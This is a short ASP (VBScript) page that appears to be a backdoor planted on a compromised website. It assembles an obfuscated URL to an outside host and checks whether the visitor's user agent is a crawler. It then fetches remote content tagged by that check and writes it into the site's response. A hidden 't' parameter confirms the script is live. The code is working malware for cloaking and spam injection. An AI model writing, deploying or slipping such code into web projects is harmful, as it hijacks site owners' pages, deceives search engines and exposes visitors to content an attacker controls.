<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
On Error Resume Next
Function GetCode(str,regstr)
	Dim Reg,serStr,Cols
	Set Reg= new RegExp
	Reg.IgnoreCase = True
	Reg.MultiLine = True
	Reg.Pattern =regstr
	If Reg.test(str) Then
	   Set Cols = Reg.Execute(str)
	   GetCode=Cols(0).SubMatches(0)
	Else 
	   GetCode=""
	End If
	Set Cols = Nothing
	Set Reg = Nothing
End Function
Function  getHTTPPage(URL)
Set   HTTPReq   =   Server.createobject("Msxml2.XMLHTTP")    
HTTPReq.Open   "GET",   URL,   False 
HTTPReq.send 
If   HTTPReq.readyState   <>   4   Then   Exit   Function 
getHTTPPage   =   Bytes2bStr(HTTPReq.responseBody) 
Set   HTTPReq   =   Nothing 
End   Function
Dim fromsite
test = Request.QueryString("t")
If test = "t" Then
	Response.Write "got"
Else
fromsite = agree&getdo&"/it/borsa/0320.php?"&check
End If
Function agree()
agree =Replace(Replace("hbbp:ww","b","t"),"w","/")
End Function
Function   Bytes2bStr(vin)
Dim   BytesStream,StringReturn
Set   BytesStream   =   Server.CreateObject("ADODB.Stream")
BytesStream.Type   =   2
BytesStream.Open
BytesStream.WriteText   vin
BytesStream.Position   =   0
BytesStream.Charset   =   "UTF-8"
BytesStream.Position   =   2
StringReturn   =BytesStream.ReadText
BytesStream.close 
Set   BytesStream   =   Nothing 
Bytes2bStr   =   StringReturn 
End   Function
Function getdo()
getdo = Replace(Replace(Replace("10___0;_ki_s_s__de_v,co__m","_",""),";","."),",",".")
End function
htmls = getHTTPPage(fromsite)
response.write htmls
Function check()
	user_agent=Request.ServerVariables("HTTP_USER_AGENT")
    allow_agent=split("bot,spider,slurp,crawler,ia_archiver,altavista ",",")
    check_agent=false
    For agenti=lbound(allow_agent) to ubound(allow_agent)
        If instr(1,user_agent,allow_agent(agenti),1)>0 then
            check_agent=true
            exit for
        end if
    Next
	If check_agent=true then  
	spider = "bot=0"
	Else 
	spider = "bot=1"
	End if
    check=spider
End function
%>